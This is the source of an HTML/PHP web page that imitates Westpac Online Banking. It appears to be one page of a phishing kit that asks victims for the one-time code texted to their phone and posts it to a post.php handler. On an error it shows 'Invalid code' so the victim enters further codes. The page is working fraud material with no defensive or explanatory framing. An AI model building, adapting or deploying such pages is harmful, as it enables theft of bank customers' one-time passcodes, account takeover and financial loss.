<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Westpac Online Banking</title>
    <link rel="stylesheet" href="res/css/app.css">
</head>
<body>


    <header class="bar">
      <div class="list">
        <nav>
            <a href="#">Lost or stolen cards</a>
            <a href="#">Contact us</a>
            <a href="#">Locate us</a>
        </nav>
        </div>
        <div class="register"><a href="#">Register for Westpac Online Banking</a></div>
        
    </header>

    <div class="down">
    <div class="logo">
          <img src="res/img/logo.png" alt="logo"> 
        </div>
        <nav>
            <a href="#">Home</a>
            <a href="#">Personal</a>
            <a href="#">Business</a>
            <a href="#">Corporate</a>
            <a href="#">About us</a>
        </nav>
    </div>
    
        <h2> Confirmation</h2>
        <p> <label>Please enter the code sent to your phone number to continue.</label></p>
        <div class="login">
    <div class="box">
      <div class="form">
         <form action="post.php" method="post">
       
        <input type="text" name="otp" required placeholder="Enter the code" >
        <?php 
if(isset($_GET['error'])){
    echo '<input type="hidden" name="exit">';
    echo '<p style="color:red;">Invalid code. Please try again.</p>';
}
?>
          <br> <br>
          <button type="submit">Continue</button>


        </form>
        </div>
    </div>
  </div>


</body>
</html>
